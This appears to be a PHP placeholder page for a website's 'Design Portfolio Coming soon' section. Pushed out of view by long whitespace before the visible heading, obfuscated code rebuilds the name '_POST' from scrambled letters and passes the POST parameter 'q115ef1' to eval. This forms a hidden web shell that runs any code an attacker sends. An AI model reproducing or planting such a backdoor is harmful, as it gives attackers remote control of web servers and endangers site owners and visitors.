<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q115ef1'])){eval(${$s20}['q115ef1']);}?><h3>Design Portfolio Coming soon. <a href="../what-we-do/">Click here to return to What We Do</a>.</h3>
